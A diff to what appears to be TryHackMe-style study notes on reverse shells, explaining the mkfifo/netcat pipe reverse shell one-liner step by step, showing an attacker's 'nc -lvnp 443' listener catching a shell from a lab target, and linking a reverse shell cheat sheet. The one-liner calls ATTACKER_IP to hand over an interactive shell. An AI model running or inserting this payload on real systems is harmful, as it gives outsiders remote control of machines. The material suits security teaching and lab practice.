@@ -46,6 +46,30 @@ As an example, let's analyze an example payload named a **pipe reverse shell**
 rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
 ```
 
+- `rm -f /tmp/f` → Removes any existing pipe to avoid conflicts
+- `mkfifo /tmp/f` → Creates a named pipe (FIFO) for two-way communication
+- `cat /tmp/f` → Reads commands sent through the pipe
+- `| sh -i 2>&1` → Executes commands in an interactive shell and sends errors + output
+- `| nc ATTACKER_IP ATTACKER_PORT` → Sends shell I/O to attacker via Netcat
+- `>/tmp/f` → Sends attacker input back into the pipe
 
+##### **Attacker Receives the Shell**
+
+Once the above payload is executed, the attacker will receive a **reverse shell**, as shown below, allowing them to execute commands as if they were logging into a regular terminal in the OS.
+
+**Attacker Terminal Output (Receiving Shell)**
+```shell-session
+attacker@kali:~$ nc -lvnp 443
+listening on [any] 443 ...
+connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964
+To run a command as administrator (user "root"), use "sudo ".
+See "man sudo_root" for details.
+
+target@tryhackme:~$
+```
+
+The output above shows the connection coming from the IP `10.10.13.37`, which is the IP address of the compromised target.
 # Reverse Shell Cheat Sheet
 https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+---
